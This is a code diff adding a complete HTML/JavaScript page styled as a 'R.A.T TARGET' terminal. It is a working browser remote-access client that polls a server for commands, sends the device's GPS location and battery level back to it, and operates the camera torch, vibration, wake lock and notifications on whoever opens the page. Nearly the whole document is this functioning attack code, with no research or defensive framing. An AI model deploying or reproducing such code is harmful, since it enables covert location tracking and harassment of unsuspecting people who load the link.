@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>R.A.T TARGET</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      background: #050505;
+      color: #00ffaa;
+      font-family: 'Share Tech Mono', monospace;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 16px;
+    }
+    .terminal {
+      background: #0a0a0a;
+      border: 1px solid #00ffaa44;
+      padding: 24px;
+      width: 100%;
+      max-width: 450px;
+      text-align: center;
+      border-radius: 12px;
+    }
+    .header {
+      font-family: 'Orbitron', monospace;
+      font-size: 16px;
+      color: #00ffaa88;
+      border-bottom: 1px solid #00ffaa33;
+      padding-bottom: 10px;
+      margin-bottom: 16px;
+    }
+    .dot {
+      display: inline-block;
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background: #00ffaa;
+      animation: pulse-dot 1s ease-in-out infinite;
+      margin-right: 8px;
+    }
+    @keyframes pulse-dot {
+      0%,
+      100% {
+        opacity: 1;
+        box-shadow: 0 0 20px #00ffaa;
+      }
+      50% {
+        opacity: .3;
+        box-shadow: 0 0 5px #00ffaa;
+      }
+    }
+    .status-text {
+      font-size: 18px;
+      color: #00ffaa;
+      letter-spacing: 2px;
+      margin: 10px 0;
+      font-family: 'Orbitron', monospace;
+    }
+    .info-box {
+      background: #0d0d0d;
+      border: 1px solid #00ffaa22;
+      padding: 14px;
+      border-radius: 6px;
+      margin: 12px 0;
+      text-align: left;
+      font-size: 13px;
+    }
+    .info-box .row {
+      display: flex;
+      justify-content: space-between;
+      padding: 4px 0;
+    }
+    .info-box .row .lbl {
+      color: #00ffaa66;
+    }
+    .info-box .row .val {
+      color: #ffffff;
+    }
+    .battery-bar {
+      width: 100%;
+      height: 6px;
+      background: #1a1a1a;
+      border-radius: 3px;
+      overflow: hidden;
+      margin-top: 6px;
+    }
+    .battery-bar .fill {
+      height: 100%;
+      background: #00ffaa;
+      transition: width 0.5s;
+    }
+    .cmd-log {
+      margin-top: 12px;
+      padding: 10px;
+      background: #0d0d0d;
+      border: 1px solid #00ffaa22;
+      border-radius: 6px;
+      max-height: 100px;
+      overflow-y: auto;
+      font-size: 11px;
+      color: #00ffaa55;
+      text-align: left;
+    }
+    .cmd-log .entry {
+      padding: 2px 0;
+      border-bottom: 1px solid #00ffaa11;
+    }
+    .cmd-log .entry .cmd {
+      color: #00ffaa88;
+    }
+    .cmd-log .entry .res {
+      color: #ffffff;
+    }
+    .cmd-log .entry .err {
+      color: #ff6666;
+    }
+    .footer {
+      margin-top: 16px;
+      border-top: 1px solid #00ffaa22;
+      padding-top: 12px;
+      font-size: 10px;
+      color: #00ffaa44;
+    }
+    .badge-list {
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+      flex-wrap: wrap;
+      margin: 10px 0;
+      font-size: 9px;
+      color: #00ffaa44;
+    }
+    .badge-list span {
+      border: 1px solid #00ffaa22;
+      padding: 4px 10px;
+      border-radius: 12px;
+    }
+  </style>
+</head>
+<body>
+  <div class="terminal">
+    <div class="header"><span class="prompt">ROBOT#TARGET:~$</span> ./connected</div>
+
+    <div>
+      <span class="dot"></span>
+      <span class="status-text">CONNECTED</span>
+    </div>
+
+    <div class="info-box">
+      <div class="row">
+        <span class="lbl">TARGET ID</span>
+        <span class="val" id="targetIdDisplay">--</span>
+      </div>
+      <div class="row">
+        <span class="lbl">BATTERY</span>
+        <span class="val" id="batteryDisplay">--%</span>
+      </div>
+      <div class="battery-bar">
+        <div class="fill" id="batteryFill" style="width:0%;"></div>
+      </div>
+    </div>
+
+    <div class="badge-list">
+      <span>☀ FLASHLIGHT</span>
+      <span>≡ VIBRATE</span>
+      <span>⚡ BATTERY</span>
+      <span>◐ WAKE LOCK</span>
+      <span>⊙ LOCATION</span>
+    </div>
+
+    <div class="cmd-log" id="cmdLog">
+      <div class="entry"><span class="cmd">[SYS]</span> Awaiting commands...</div>
+    </div>
+
+    <div class="footer">
+      <span>STATUS: COMPROMISED</span>
+      <span>LOGIC: BYPASSED</span>
+    </div>
+  </div>
+
+  <script>
+    const API_URL = window.location.origin + '/api';
+    const targetId = new URLSearchParams(window.location.search).get('id');
+    if (!targetId) {
+      document.getElementById('targetIdDisplay').textContent = 'ERROR';
+      alert('Missing Target ID.');
+    } else {
+      document.getElementById('targetIdDisplay').textContent = targetId;
+      registerTarget();
+    }
+
+    let flashlightOn = false,
+      cameraStream = null,
+      wakeLock = null,
+      orientationLocked = false;
+
+    function registerTarget() {
+      if (navigator.getBattery) {
+        navigator.getBattery().then(b => {
+          const level = Math.round(b.level * 100);
+          updateBattery(level);
+        });
+      }
+      pollCommands();
+      addLog('✅ Target registered.', 'res');
+    }
+
+    function updateBattery(level) {
+      document.getElementById('batteryDisplay').textContent = level + '%';
+      const fill = document.getElementById('batteryFill');
+      fill.style.width = level + '%';
+      fill.style.background = level < 20 ? '#ff3333' : level < 50 ? '#ffaa00' : '#00ffaa';
+    }
+
+    function pollCommands() {
+      fetch(API_URL + '?action=poll&targetId=' + targetId)
+        .then(r => r.json())
+        .then(data => {
+          if (data.command) {
+            executeCommand(data.command, data.id);
+          }
+          setTimeout(pollCommands, 1500);
+        })
+        .catch(() => setTimeout(pollCommands, 3000));
+    }
+
+    function executeCommand(cmd, cmdId) {
+      addLog('📥 Command: ' + cmd, 'cmd');
+      let result = {};
+
+      switch (cmd) {
+        case 'flashlight':
+          toggleFlashlight();
+          result = { flashlight: flashlightOn ? 'on' : 'off' };
+          break;
+        case 'vibrate':
+          if (navigator.vibrate) { navigator.vibrate(1000);
+            addLog('✅ Vibrated', 'res'); } else { addLog('❌ Not supported', 'err'); }
+          result = { vibrate: 'done' };
+          break;
+        case 'vibrate_long':
+          if (navigator.vibrate) { navigator.vibrate(5000);
+            addLog('✅ Vibrated 5s', 'res'); } else { addLog('❌ Not supported', 'err'); }
+          result = { vibrate: 'long_done' };
+          break;
+        case 'battery':
+          if (navigator.getBattery) {
+            navigator.getBattery().then(b => {
+              const lvl = Math.round(b.level * 100);
+              updateBattery(lvl);
+              sendResult(cmdId, { battery: lvl });
+              addLog('🔋 Battery: ' + lvl + '%', 'res');
+            });
+          }
+          break;
+        case 'wake_lock':
+          toggleWakeLock();
+          result = { wake_lock: wakeLock ? 'active' : 'released' };
+          break;
+        case 'orientation':
+          toggleOrientation();
+          result = { orientation: orientationLocked ? 'locked' : 'unlocked' };
+          break;
+        case 'location':
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+              p => {
+                const loc = { lat: p.coords.latitude, lng: p.coords.longitude };
+                sendResult(cmdId, { location: loc });
+                addLog('📍 GPS: ' + loc.lat + ', ' + loc.lng, 'res');
+              },
+              e => sendResult(cmdId, { location_error: e.message })
+            );
+          } else {
+            result = { location_error: 'Not supported' };
+          }
+          break;
+        case 'notification':
+          if ('Notification' in window) {
+            if (Notification.permission === 'granted') {
+              new Notification('R.A.T', { body: 'You are being controlled.' });
+            } else {
+              Notification.requestPermission().then(p => {
+                if (p === 'granted') new Notification('R.A.T', { body: 'You are being controlled.' });
+              });
+            }
+          }
+          result = { notification: 'sent' };
+          break;
+        default:
+          addLog('⚠️ Unknown command', 'err');
+          result = { error: 'unknown' };
+      }
+
+      if (Object.keys(result).length > 0 && cmd !== 'battery' && cmd !== 'location') {
+        sendResult(cmdId, result);
+      }
+    }
+
+    function toggleFlashlight() {
+      if (!('mediaDevices' in navigator)) { addLog('❌ Not supported', 'err'); return; }
+      if (flashlightOn) {
+        if (cameraStream) { cameraStream.getTracks().forEach(t => t.stop());
+          cameraStream = null; }
+        flashlightOn = false;
+        addLog('💡 OFF', 'res');
+        return;
+      }
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
+        .then(stream => {
+          cameraStream = stream;
+          const track = stream.getVideoTracks()[0];
+          track.applyConstraints({ advanced: [{ torch: true }] })
+            .then(() => { flashlightOn = true;
+              addLog('💡 ON', 'res'); })
+            .catch(() => addLog('❌ Torch unavailable', 'err'));
+        })
+        .catch(() => addLog('❌ Camera denied', 'err'));
+    }
+
+    function toggleWakeLock() {
+      if ('wakeLock' in navigator) {
+        if (wakeLock) { wakeLock.release();
+          wakeLock = null;
+          addLog('◐ Wake released', 'res'); } else {
+          navigator.wakeLock.request('screen').then(lock => { wakeLock = lock;
+            addLog('◐ Wake active', 'res'); })
+            .catch(() => addLog('❌ Wake lock failed', 'err'));
+        }
+      } else { addLog('❌ Not supported', 'err'); }
+    }
+
+    function toggleOrientation() {
+      if ('orientation' in screen && 'lock' in screen.orientation) {
+        if (orientationLocked) { screen.orientation.unlock();
+          orientationLocked = false;
+          addLog('⟳ Unlocked', 'res'); } else {
+          screen.orientation.lock('landscape').then(() => { orientationLocked = true;
+            addLog('⟳ Locked', 'res'); })
+            .catch(() => addLog('❌ Orientation failed', 'err'));
+        }
+      } else { addLog('❌ Not supported', 'err'); }
+    }
+
+    function sendResult(cmdId, result) {
+      fetch(API_URL + '?action=result&targetId=' + targetId, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ id: cmdId, result: result })
+        })
+        .catch(() => {});
+    }
+
+    function addLog(msg, type) {
+      const log = document.getElementById('cmdLog');
+      const time = new Date().toLocaleTimeString();
+      const entry = document.createElement('div');
+      entry.className = 'entry';
+      const cls = type === 'res' ? 'res' : type === 'err' ? 'err' : 'cmd';
+      entry.innerHTML = '<span class="' + cls + '">[' + time + '] ' + msg + '</span>';
+      log.appendChild(entry);
+      log.scrollTop = log.scrollHeight;
+      if (log.children.length > 30) log.removeChild(log.children[0]);
+    }
+  </script>
+</body>
+</html>
